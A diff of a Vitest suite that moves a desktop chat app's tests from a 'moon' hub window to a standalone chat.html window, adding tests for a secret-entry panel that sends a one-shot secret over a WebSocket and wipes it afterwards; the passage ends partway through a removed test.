@@ -1,236 +1,101 @@
 // @vitest-environment jsdom
+//
+// chat-window.test.ts — behavioral suite for frontend/chat.html, the chat
+// WIDGET WINDOW (widget-system.md Phase 4 "extraction-as-new-page").
+//
+// The chat-scope describes are COPIES of their moon-app.test.ts originals
+// (which keep covering the hub's dormant chat code until the Phase 6
+// cleanup), adapted to the chat.html harness: widget-window chrome instead
+// of the moon, window-targeted voice/hub events, and the window owning the
+// thread. New-here coverage: the secret-prompt engine surface, thread
+// bootstrap, hello extras (buildSha/availableModels/protocol skew), window
+// chrome + hub-event return channel, and the attachments composer.
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
 import * as fs from 'node:fs'
 import * as path from 'node:path'
 
 // jsdom never fetches external <script src> tags, so required vendor files
 // are loaded by hand, in the same order the page declares them (same
-// mechanism as widget-window.test.ts).
+// mechanism as moon-app.test.ts / widget-window.test.ts).
 function loadVendorInto(target: any, file: string) {
   const src = fs.readFileSync(path.resolve(__dirname, '../frontend/vendor', file), 'utf8')
   new Function('globalThis', src)(target)
 }
 
-describe('Luna Moon Companion - Behavioral Driven Tests', () => {
-  let mockStartDragging: any
-  let mockGetCurrentWindow: any
+describe('Luna Chat Window (chat.html) - Behavioral Tests', () => {
   let htmlContent: string
+  // Window-targeted event handlers captured from getCurrentWindow().listen —
+  // voice-state / voice-transcript / voice-error / hub-event / dock-group.
+  let windowEventHandlers: Record<string, (e: { payload: any }) => void>
+  let mockMe: any
 
   beforeEach(() => {
-    // 1. Load index.html content
-    const htmlPath = path.resolve(__dirname, '../frontend/index.html')
-    htmlContent = fs.readFileSync(htmlPath, 'utf8')
-
-    // 2. Extract and load body HTML structure
+    // 1. Load chat.html content + body structure.
+    htmlContent = fs.readFileSync(path.resolve(__dirname, '../frontend/chat.html'), 'utf8')
     const bodyMatch = htmlContent.match(/<body>([\s\S]*?)<\/body>/)
-    const bodyHtml = bodyMatch ? bodyMatch[1] : htmlContent
-    document.body.innerHTML = bodyHtml
+    document.body.innerHTML = bodyMatch ? bodyMatch[1] : ''
 
-    // 3. Mock the Tauri native window interface
-    mockStartDragging = vi.fn().mockResolvedValue(undefined)
-    const mockSetSize = vi.fn().mockResolvedValue(undefined)
-    const mockSetAlwaysOnTop = vi.fn().mockResolvedValue(undefined)
-    mockGetCurrentWindow = vi.fn().mockReturnValue({
-      startDragging: mockStartDragging,
-      setSize: mockSetSize,
-      setAlwaysOnTop: mockSetAlwaysOnTop,
-    })
-
-    class MockLogicalSize {
-      type = 'Logical'
-      constructor(public width: number, public height: number) {}
+    // 2. Mock the Tauri window surface. NOTE: no `core` by default — boot
+    // degrades exactly like the hub harness (voice unavailable, localStorage
+    // connection branch). Tests that need invoke inject __TAURI__.core.
+    windowEventHandlers = {}
+    mockMe = {
+      label: 'chat-test',
+      listen: vi.fn(async (name: string, cb: (e: { payload: any }) => void) => {
+        windowEventHandlers[name] = cb
+        return () => {}
+      }),
+      onMoved: vi.fn(async () => () => {}),
+      isMinimized: vi.fn(async () => false),
+      scaleFactor: vi.fn(async () => 1),
+      outerPosition: vi.fn(async () => ({ x: 0, y: 0 })),
+      outerSize: vi.fn(async () => ({ width: 560, height: 520 })),
+      setPosition: vi.fn(async () => {}),
     }
-
-    // Attach mock to JSDOM window
     ;(window as any).__TAURI__ = {
       window: {
-        getCurrentWindow: mockGetCurrentWindow,
-        LogicalSize: MockLogicalSize,
-      }
+        getCurrentWindow: () => mockMe,
+        Window: { getByLabel: vi.fn(async () => null) },
+      },
+      event: { listen: vi.fn(async () => () => {}) },
     }
-    // Expose mock setSize and setAlwaysOnTop for tests
-    ;(window as any).__TAURI__.mockSetSize = mockSetSize
-    ;(window as any).__TAURI__.mockSetAlwaysOnTop = mockSetAlwaysOnTop
 
-    // 4. Load the vendor modules the app script uses at definition time
-    // (LunaProtocol.PROTOCOL_VERSION, LunaWS.createFrameRegistry), then
-    // extract and execute the frontend script to bind event listeners.
+    // 3. Load the vendor modules the page script uses at definition time.
     loadVendorInto(window, 'moon-protocol.js')
     loadVendorInto(window, 'moon-ws.js')
     loadVendorInto(window, 'moon-markdown.js')
-    const scriptMatch = htmlContent.match(/<script>([\s\S]*?)<\/script>/)
-    const jsCode = scriptMatch ? scriptMatch[1] : ''
-    
+    loadVendorInto(window, 'deck-snap.js')
+    loadVendorInto(window, 'moon-dock.js')
+
     // Clean localStorage so persisted-prefs tests don't leak across cases.
     localStorage.clear()
 
-    // Execute JS code inside the JSDOM window context
-    const runScript = new Function(jsCode)
-    runScript()
+    // 4. Select the inline page script by CONTENT, not position (an added
+    // config stub must fail loudly here, not silently run the wrong script).
+    const inlineScripts = [...htmlContent.matchAll(/<script>([\s\S]*?)<\/script>/g)]
+      .map((m) => m[1])
+      .filter((s) => s.includes('WebSocketEngine'))
+    expect(inlineScripts).toHaveLength(1)
+    new Function(inlineScripts[0])()
 
-    // Enable Vitest fake timers for simulated messaging delays
     vi.useFakeTimers()
   })
 
   afterEach(() => {
     document.body.innerHTML = ''
+    delete (window as any).__TAURI__
+    delete (window as any).__MoonInternals
     delete (window as any).LunaProtocol
     delete (window as any).LunaWS
+    delete (window as any).LunaMarkdown
+    delete (window as any).LunaDeckSnap
+    delete (window as any).LunaDock
     vi.restoreAllMocks()
     vi.useRealTimers()
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Dragging the Moon Widget
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Native Window Dragging', () => {
-    it('Scenario: User drags the crescent moon sphere -> Triggers native macOS dragging', () => {
-      const moon = document.getElementById('moon')
-      expect(moon).not.toBeNull()
-
-      // Dispatch mousedown/pointerdown to simulate grabbing the moon
-      const pointerDownEvent = new MouseEvent('pointerdown', {
-        bubbles: true,
-        clientX: 100,
-        clientY: 100,
-        buttons: 1, // Primary click
-      })
-      moon!.dispatchEvent(pointerDownEvent)
-
-      // Verification: The programmatic drag method MUST be called exactly once
-      expect(mockGetCurrentWindow).toHaveBeenCalled()
-      expect(mockStartDragging).toHaveBeenCalledTimes(1)
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Chat Panel Toggling
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Chat Panel Toggling', () => {
-    it('Scenario: Chat panel is hidden initially, clicking the moon opens it and expands window', async () => {
-      const chatPanel = document.getElementById('chat-panel')
-      const moon = document.getElementById('moon')
-      const mockSetSize = (window as any).__TAURI__.mockSetSize
-      
-      expect(chatPanel).not.toBeNull()
-      expect(chatPanel!.classList.contains('active')).toBe(false)
-
-      // Simulate a quick pointer down & pointer up (single click click-toggle)
-      const pointerDown = new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 })
-      const pointerUp = new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 })
-      
-      moon!.dispatchEvent(pointerDown)
-      
-      // Fast-forward slightly and release in the same coordinates
-      vi.advanceTimersByTime(50)
-      moon!.dispatchEvent(pointerUp)
-
-      // Flush DOM microtasks to let the await inside toggleChat resolve
-      await Promise.resolve()
-      await Promise.resolve()
-
-      // Verification: Chat panel should now be toggled active (open)
-      expect(chatPanel!.classList.contains('active')).toBe(true)
-      
-      // Verification: Window should be expanded programmatically to 560x520
-      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 560, height: 520 })
-    })
-
-    it('Scenario: Clicking the Close (X) button closes the open chat panel and shrinks window', async () => {
-      const chatPanel = document.getElementById('chat-panel')
-      const closeBtn = document.getElementById('close-chat')
-      const mockSetSize = (window as any).__TAURI__.mockSetSize
-      
-      // Pre-condition: Open the chat panel
-      chatPanel!.classList.add('active')
-      expect(chatPanel!.classList.contains('active')).toBe(true)
-
-      // Simulate clicking the close button
-      const clickEvent = new MouseEvent('click', { bubbles: true })
-      closeBtn!.dispatchEvent(clickEvent)
-
-      // Verification: Chat panel should be closed
-      expect(chatPanel!.classList.contains('active')).toBe(false)
-      
-      // Fast forward past the 300ms transition timeout for window shrinking
-      vi.advanceTimersByTime(350)
-      
-      // Flush microtasks for the async setSize call inside timeout
-      await Promise.resolve()
-      await Promise.resolve()
-      
-      // Verification: Window should shrink back to the 140x185 minimized size
-      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 140, height: 185 })
-    })
-
-    it('Scenario: Reopens to the previously persisted chat size instead of the 560x520 default', async () => {
-      const chatPanel = document.getElementById('chat-panel')
-      const moon = document.getElementById('moon')
-      const mockSetSize = (window as any).__TAURI__.mockSetSize
-
-      // Seed the persisted size BEFORE the user opens the panel.
-      // (PanelSize.load() runs inside toggleChat's expand branch, so seeding
-      //  after script execution still works — it's read on each open.)
-      localStorage.setItem('luna.moon.chatSize', JSON.stringify({ w: 720, h: 640 }))
-
-      // Quick click on the moon -> toggleChat() opens the panel.
-      moon!.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
-      vi.advanceTimersByTime(50)
-      moon!.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
-
-      // Flush the awaited setSize inside toggleChat.
-      await Promise.resolve()
-      await Promise.resolve()
-
-      expect(chatPanel!.classList.contains('active')).toBe(true)
-      // Opens at the persisted size, NOT 560x520.
-      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 720, height: 640 })
-    })
-
-    it('Scenario: Reopens at MIN bounds when localStorage holds a sub-minimum size (clamp on load)', async () => {
-      const moon = document.getElementById('moon')
-      const mockSetSize = (window as any).__TAURI__.mockSetSize
-
-      // Hostile / stale value: smaller than MIN. PanelSize.clamp() should floor it
-      // to (360, 360) on load so the panel can never open below its minimum bounds.
-      localStorage.setItem('luna.moon.chatSize', JSON.stringify({ w: 100, h: 100 }))
-
-      moon!.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
-      vi.advanceTimersByTime(50)
-      moon!.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
-      await Promise.resolve()
-      await Promise.resolve()
-
-      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 360, height: 360 })
-    })
-
-    it('Scenario: Releasing the resize grip persists the final dragged size to localStorage', () => {
-      const grip = document.getElementById('resize-grip')
-      expect(grip).not.toBeNull()
-
-      // pointerdown captures startW/startH = TauriService.lastSize (140x185 on boot)
-      //   and startX/startY = the pointer's screen coords.
-      grip!.dispatchEvent(new MouseEvent('pointerdown', {
-        bubbles: true, clientX: 0, clientY: 0, screenX: 100, screenY: 100,
-      }))
-      // pointermove computes pendingW = max(MIN_W=360, round(140 + dx)),
-      //   pendingH = max(MIN_H=360, round(185 + dy)). With dx=dy=400 -> 540, 585.
-      grip!.dispatchEvent(new MouseEvent('pointermove', {
-        bubbles: true, clientX: 0, clientY: 0, screenX: 500, screenY: 500,
-      }))
-      // pointerup -> endResize -> PanelSize.save(pendingW, pendingH).
-      grip!.dispatchEvent(new MouseEvent('pointerup', {
-        bubbles: true, clientX: 0, clientY: 0, screenX: 500, screenY: 500,
-      }))
-
-      const stored = localStorage.getItem('luna.moon.chatSize')
-      expect(stored).not.toBeNull()
-      expect(JSON.parse(stored!)).toEqual({ w: 540, h: 585 })
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Messaging & Responses
+  // Behavioral Feature: Composer submit + the 90s turn watchdog
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: Chat Input & Turn Watchdog', () => {
     // The old mock that faked an assistant reply via setTimeout is gone — the
@@ -284,121 +149,7 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Feature: Visual DOM Structure Snapshots
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Visual DOM Structure Snapshots', () => {
-    // Snapshot the structural DOM only — elide the inline <script> body. These
-    // assert "visual structure", but document.body.innerHTML also contains the
-    // entire app script, so any JS edit (resume fix, version-skew banner, async
-    // load_connection) spuriously breaks them. Stripping the script source keeps
-    // them a real structure check, not a "source unchanged" tripwire.
-    const structuralDom = (html: string) =>
-      html.replace(/(<script\b[^>]*>)[\s\S]*?(<\/script>)/gi, '$1/* elided for snapshot */$2')
-
-    it('Scenario: Closed State Snapshot matches the exact design pattern', () => {
-      expect(structuralDom(document.body.innerHTML)).toMatchSnapshot()
-    })
-
-    it('Scenario: Open State Snapshot matches the exact design pattern', async () => {
-      const moon = document.getElementById('moon')
-      const pointerDown = new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 })
-      const pointerUp = new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 })
-
-      moon!.dispatchEvent(pointerDown)
-      vi.advanceTimersByTime(50)
-      moon!.dispatchEvent(pointerUp)
-
-      await Promise.resolve()
-      await Promise.resolve()
-
-      expect(structuralDom(document.body.innerHTML)).toMatchSnapshot()
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Feature: Companion Settings Panel
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Companion Settings Panel', () => {
-    it('Scenario: Toggling Settings Panel slides it in and out', () => {
-      const toggleSettings = document.getElementById('toggle-settings')
-      const settingsPanel = document.getElementById('settings-panel')
-      const closeSettingsBtn = document.getElementById('close-settings-btn')
-
-      expect(settingsPanel!.classList.contains('active')).toBe(false)
-
-      // Open settings
-      toggleSettings!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
-      expect(settingsPanel!.classList.contains('active')).toBe(true)
-
-      // Close settings
-      closeSettingsBtn!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
-      expect(settingsPanel!.classList.contains('active')).toBe(false)
-    })
-
-    // The Always-on-Top toggle and Global-Shortcut recorder UI moved to the
-    // standalone General panel — covered in test/panel-general.test.ts.
-
-    it('Scenario: Close on Blur collapses the chat panel on click away', async () => {
-      // The checkbox moved to the General panel (test/panel-general.test.ts);
-      // the hub reads the persisted luna_close_on_blur key directly on blur.
-      const chatPanel = document.getElementById('chat-panel')
-      const mockSetSize = (window as any).__TAURI__.mockSetSize
-
-      // Set chat panel active/open
-      chatPanel!.classList.add('active')
-      expect(chatPanel!.classList.contains('active')).toBe(true)
-
-      // 1. When Close on Blur is disabled -> click away (blur) does NOT collapse chat
-      localStorage.setItem('luna_close_on_blur', 'false')
-
-      window.dispatchEvent(new Event('blur'))
-      expect(chatPanel!.classList.contains('active')).toBe(true)
-
-      // 2. When Close on Blur is enabled -> click away (blur) collapses chat
-      localStorage.setItem('luna_close_on_blur', 'true')
-
-      window.dispatchEvent(new Event('blur'))
-      expect(chatPanel!.classList.contains('active')).toBe(false)
-
-      // Wait for shrink window resize timeout
-      vi.advanceTimersByTime(350)
-      await Promise.resolve()
-      await Promise.resolve()
-
-      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 140, height: 185 })
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Feature: Capability & Permissions Configuration Verification
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Tauri Capability & Configuration', () => {
-    it('Scenario: Capability default.json includes required window permissions', () => {
-      const capPath = path.resolve(__dirname, '../src-tauri/capabilities/default.json')
-      const capContent = fs.readFileSync(capPath, 'utf8')
-      const cap = JSON.parse(capContent)
-      
-      expect(cap.permissions).toContain('core:window:default')
-      expect(cap.permissions).toContain('core:window:allow-set-size')
-      expect(cap.permissions).toContain('core:window:allow-start-dragging')
-      expect(cap.permissions).toContain('core:window:allow-set-always-on-top')
-    })
-
-    it('Scenario: Tauri configuration settings protect transparency and resizability', () => {
-      const configPath = path.resolve(__dirname, '../src-tauri/tauri.conf.json')
-      const configContent = fs.readFileSync(configPath, 'utf8')
-      const config = JSON.parse(configContent)
-      
-      const windowConfig = config.app?.windows?.[0]
-      expect(windowConfig).toBeDefined()
-      expect(windowConfig.transparent).toBe(true)
-      expect(windowConfig.resizable).toBe(true)
-      expect(windowConfig.decorations).toBe(false)
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Feature: Live-streaming markdown render
+  // Feature: Live-streaming markdown render (vendor/moon-markdown.js through the page)
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: Streaming markdown formatting', () => {
     // The pure helpers + StreamRender are exposed via window.__MoonInternals
@@ -970,11 +721,7 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Feature: ChatState reducer (post-refactor data model)
-  //
-  // ChatState is the source-of-truth for the chat transcript. The renderer is
-  // a pure function of state, so any bug-class involving "DOM and the streaming
-  // buffer disagree" is captured here at the reducer level.
+  // Feature: ChatState reducer (the chat transcript source of truth)
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: ChatState reducer', () => {
     const state = () => (window as any).__MoonInternals.ChatState
@@ -1078,10 +825,6 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
 
   // ───────────────────────────────────────────────────────────────────────────
   // Feature: ChatRenderer + ChatLoop (end-to-end via __MoonInternals.handleFrame)
-  //
-  // These tests exercise the wire-frame -> reducer -> renderer pipeline that
-  // production uses. They replace the older DOM-poke tests for the removed
-  // sweepTrailingEmptyAssistantBubbles / isVisuallyEmpty helpers.
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: end-to-end frame pipeline', () => {
     const M = () => (window as any).__MoonInternals
@@ -1483,45 +1226,10 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       expect(chat.querySelector('.timeline .typing-dots')).toBeNull()
       expect(chat.querySelector('.timeline-summary-label')!.textContent).toContain('Worked for')
     })
-  // ─────────────────────────────────────────────────────────────────────────
-  // The Skills / Connectors / Vault settings tabs moved out of the hub modal
-  // into standalone panel windows. Their frame-pipeline + UI coverage now
-  // lives in test/panel-skills.test.ts, test/panel-connectors.test.ts and
-  // test/panel-vault.test.ts. The secret-prompt panel (agent request_secret)
-  // is still hub-hosted, so its collapse-wipe keeps a test here.
-  // ─────────────────────────────────────────────────────────────────────────
-  describe('Feature: secret-prompt wipe on chat collapse', () => {
-    const M = () => (window as any).__MoonInternals
-
-    it('chat-collapse path wipes the secret-prompt input', async () => {
-      const m = M()
-      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
-
-      const chatPanel = document.getElementById('chat-panel')!
-      chatPanel.classList.add('active')
-
-      const secretIn = document.getElementById('secret-prompt-input') as HTMLInputElement
-      secretIn.value = 'my-secret'
-
-      // Clicking close-chat collapses the chat — this is the collapse path that
-      // previously bypassed SettingsEngine.close().
-      document.getElementById('close-chat')!.click()
-      await Promise.resolve()
-      await Promise.resolve()
-
-      expect(chatPanel.classList.contains('active')).toBe(false)
-      expect(secretIn.value).toBe('')
-    })
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Feature: UserAsk / alignment-survey (Phase 3 D3, Moon-side wiring)
-  //
-  // The TUI already paints a survey modal when the server pushes a
-  // `survey-request` frame; this suite is the Moon-UI parity. We drive the
-  // pipeline at the same seam the production WS handler uses
-  // (__MoonInternals.handleFrame), then poke buttons in the panel and assert
-  // the resulting `survey-response` frame.
+  // Feature: UserAsk / alignment-survey (survey-request → survey-response)
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: UserAsk / alignment-survey panel', () => {
     const M = () => (window as any).__MoonInternals
@@ -1725,16 +1433,144 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
     })
   })
 
+  // ───────────────────────────────────────────────────────────────────────────
+  // Feature: secure secret-entry panel (agent request_secret). The hub's suite
+  // only pinned the collapse-path wipe; the chat window hosts the inputs now,
+  // so the engine surface + the registerCloseHook wipe are pinned here.
+  // ───────────────────────────────────────────────────────────────────────────
+  describe('Feature: secure secret-entry panel', () => {
+    const M = () => (window as any).__MoonInternals
+
+    const showFrame = () => M().handleFrame({
+      type: 'secret-request',
+      requestId: 'req-1',
+      prompt: 'Paste the API key for FooCorp',
+      destinationLabel: 'env:FOOCORP_API_KEY',
+    })
+    const input = () => document.getElementById('secret-prompt-input') as HTMLInputElement
+    const panel = () => document.getElementById('secret-prompt-panel') as HTMLElement
+    const status = () => document.getElementById('secret-prompt-status') as HTMLElement
+
+    beforeEach(() => {
+      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
+      ;(window as any).cancelAnimationFrame = () => {}
+      M().ChatState.reset()
+      M().SecretPromptEngine.hide()
+    })
+
+    it('a secret-request frame reveals the panel with prompt + consent destination', () => {
+      showFrame()
+      expect(panel().hidden).toBe(false)
+      expect(document.getElementById('secret-prompt-prompt')!.textContent)
+        .toBe('Paste the API key for FooCorp')
+      const consent = document.getElementById('secret-prompt-consent') as HTMLElement
+      expect(consent.hidden).toBe(false)
+      expect(consent.textContent).toContain('env:FOOCORP_API_KEY')
+      expect(input().value).toBe('')
+    })
+
+    it('a missing destinationLabel hides the consent line', () => {
+      M().handleFrame({ type: 'secret-request', requestId: 'req-nl', prompt: 'Key?' })
+      expect((document.getElementById('secret-prompt-consent') as HTMLElement).hidden).toBe(true)
+    })
+
+    it('submit with an empty value shows an error and sends nothing', () => {
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      showFrame()
+      document.getElementById('secret-prompt-submit')!.click()
+      expect(sendSpy).not.toHaveBeenCalled()
+      expect(status().textContent).toBe('Enter a value first.')
+    })
+
+    it('submit while the socket is not OPEN refuses (send() logs frames when not open — the leak guard)', () => {
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      showFrame()
+      M().State.ws = null
+      input().value = 'sk-secret'
+      document.getElementById('secret-prompt-submit')!.click()
+      expect(sendSpy).not.toHaveBeenCalled()
+      expect(status().textContent).toBe('Not connected.')
+      // Not wiped: the operator can retry after the reconnect lands.
+      expect(input().value).toBe('sk-secret')
+    })
+
+    it('submit on an OPEN socket sends ONE secret-result and wipes the input immediately', () => {
+      showFrame()
+      M().State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      input().value = 'sk-live-12345'
+      document.getElementById('secret-prompt-submit')!.click()
+      expect(sendSpy).toHaveBeenCalledTimes(1)
+      expect(sendSpy.mock.calls[0][0]).toEqual({
+        type: 'secret-result', requestId: 'req-1', secret: 'sk-live-12345',
+      })
+      expect(input().value).toBe('')          // one-shot — never retained
+      expect(status().textContent).toBe('Saving…')
+    })
+
+    it('Enter in the password field submits (single-field form feel)', () => {
+      showFrame()
+      M().State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      input().value = 'sk-enter'
+      input().dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }))
+      expect(sendSpy).toHaveBeenCalledTimes(1)
+      expect((sendSpy.mock.calls[0][0] as any).secret).toBe('sk-enter')
+    })
+
+    it('cancel sends secret-result cancelled:true (when OPEN), hides + wipes', () => {
+      showFrame()
+      M().State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      input().value = 'half-typed'
+      document.getElementById('secret-prompt-cancel')!.click()
+      expect(sendSpy).toHaveBeenCalledWith({
+        type: 'secret-result', requestId: 'req-1', cancelled: true,
+      })
+      expect(input().value).toBe('')
+      expect(panel().hidden).toBe(true)
+    })
+
+    it('secret-status: a stale requestId is ignored; the matching ok ack auto-hides after 1.5s', () => {
+      showFrame()
+      M().handleFrame({ type: 'secret-status', requestId: 'other', ok: true, message: 'nope' })
+      expect(status().textContent).toBe('')   // unmatched → ignored
+      M().handleFrame({ type: 'secret-status', requestId: 'req-1', ok: true, message: 'Saved to vault.' })
+      expect(status().textContent).toBe('Saved to vault.')
+      expect(panel().hidden).toBe(false)      // brief "saved" stays readable…
+      vi.advanceTimersByTime(1500)
+      expect(panel().hidden).toBe(true)       // …then the panel hides
+      expect(input().value).toBe('')
+    })
+
+    it('a failed secret-status leaves the message + panel visible (now inert)', () => {
+      showFrame()
+      M().handleFrame({ type: 'secret-status', requestId: 'req-1', ok: false, message: 'op vault rejected it' })
+      expect(status().textContent).toBe('op vault rejected it')
+      vi.advanceTimersByTime(5000)
+      expect(panel().hidden).toBe(false)
+      // _reqId cleared → a stray submit is inert.
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      input().value = 'retyped'
+      M().SecretPromptEngine.submit()
+      expect(sendSpy).not.toHaveBeenCalled()
+    })
+
+    it('the WS close hook wipes a typed-but-unsent secret (registerCloseHook seam)', () => {
+      showFrame()
+      input().value = 'typed-not-sent'
+      const hooks = M().WebSocketEngine._closeHooks
+      expect(hooks.length).toBeGreaterThanOrEqual(1)
+      for (const hook of hooks) hook()
+      expect(input().value).toBe('')
+      // VALUE only — the panel stays up so the success flow's brief "saved"
+      // message (server restarts → socket closes) isn't killed early.
+      expect(panel().hidden).toBe(false)
+    })
+  })
 
   // ───────────────────────────────────────────────────────────────────────────
   // Feature: handleSubmit single-fire guard (no double-send)
-  //
-  // The user observed in production that messages from the Moon were being
-  // processed multiple times. The most likely client-side amplifier is a
-  // double-fire of handleSubmit (WKWebView quirks, button double-tap, or
-  // future re-wiring). These tests pin a microtask-scoped single-fire guard
-  // in place: no matter how many times handleSubmit is invoked synchronously
-  // for the same user action, exactly ONE user-message frame goes on the wire.
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: handleSubmit single-fire guard', () => {
     const M = () => (window as any).__MoonInternals
@@ -1834,7 +1670,7 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Feature: Long-running turn timeline stays scrollable
+  // Feature: Long-running turn timeline stays scrollable (CSS regression)
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: Long-running turn timeline stays scrollable (regression)', () => {
     // Layout regression guard. jsdom does NO layout, so we can't measure
@@ -1879,14 +1715,10 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
     })
   })
 
-  })
-
   // ───────────────────────────────────────────────────────────────────────────
-  // Feature: re-tether reattach correctness (the network behavior the moon's
-  // "string" drives). Subscribe watchdog, in-memory thread preference over the
-  // on-disk file, and restart-survival persistence. No physics here (jsdom).
+  // Feature: thread reattach (subscribe watchdog, in-memory preference, restart-survival)
   // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: re-tether reattach correctness', () => {
+  describe('Feature: thread reattach correctness', () => {
     const M = () => (window as any).__MoonInternals
 
     // The shared beforeEach Tauri mock has no `core.invoke`; give each test one.
@@ -1985,1076 +1817,119 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Feature: single-thread controls — the "+ new chat" satellite stays gone and
-  // the fresh-thread reset moved to the General panel: test/panel-general.test.ts.
+  // Feature: thread bootstrap — THE CHAT WINDOW OWNS THE THREAD now
+  // (one-window-per-thread). thread-list/-created drive auto-subscribe and
+  // auto-create exactly as the hub's connection did.
   // ───────────────────────────────────────────────────────────────────────────
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Feature: re-tether swing envelope. The window grows + re-origins so the moon
-  // stays visually fixed while the bead gets room to fling. The Tauri window
-  // calls are operator-verify; here we pin the COORDINATE MATH (incl. Retina
-  // logical-px + screen-edge clamp + moon-CSS compensation) with a mocked window.
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: re-tether swing envelope (window math)', () => {
-    const M = () => (window as any).__MoonInternals
-    const mockWin = (originX: number, originY: number, sf = 1) => {
-      const setPosition = vi.fn().mockResolvedValue(undefined)
-      const setSize = vi.fn().mockResolvedValue(undefined)
-      const win = {
-        scaleFactor: vi.fn().mockResolvedValue(sf),
-        outerPosition: vi.fn().mockResolvedValue({ toLogical: () => ({ x: originX, y: originY }) }),
-        currentMonitor: vi.fn().mockResolvedValue({
-          position: { toLogical: () => ({ x: 0, y: 0 }) },
-          size: { toLogical: () => ({ width: 1440, height: 900 }) },
-        }),
-        setPosition, setSize,
-      }
-      ;(window as any).__TAURI__.window.getCurrentWindow = () => win
-      ;(window as any).__TAURI__.window.LogicalPosition = class { x: number; y: number; constructor(x: number, y: number) { this.x = x; this.y = y } }
-      return { setPosition, setSize }
-    }
-
-    it('Scenario: growToEnvelope keeps the moon visually fixed (origin shift cancels the moon re-center)', async () => {
-      const { setPosition, setSize } = mockWin(300, 200)
-      await M().TauriService.growToEnvelope()
-      const moon = document.getElementById('moon')!
-      const pos = setPosition.mock.calls[0][0]
-      // moon screen = (315,215); envelope centres the moon at window-local (175,15)
-      expect({ x: pos.x, y: pos.y }).toEqual({ x: 140, y: 200 }) // 315-175, 215-15
-      expect(moon.style.left).toBe('175px')
-      expect(moon.style.top).toBe('15px')
-      // THE invariant: newOrigin + moonCss === old moon screen position (no jump)
-      expect(pos.x + parseFloat(moon.style.left)).toBe(315)
-      expect(pos.y + parseFloat(moon.style.top)).toBe(215)
-      expect(setSize).toHaveBeenCalledWith(expect.objectContaining({ width: 460, height: 470 }))
-      expect(document.body.classList.contains('retethering')).toBe(true)
-    })
-
-    it('Scenario: a moon jammed at the screen edge clamps on-screen and compensates the moon CSS', async () => {
-      const { setPosition } = mockWin(5, 200) // near the left edge
-      await M().TauriService.growToEnvelope()
-      const moon = document.getElementById('moon')!
-      const pos = setPosition.mock.calls[0][0]
-      // moon screen = (20,215); desired origin 20-175=-155 → clamped to 0; moon CSS compensates to 20
-      expect(pos.x).toBe(0)
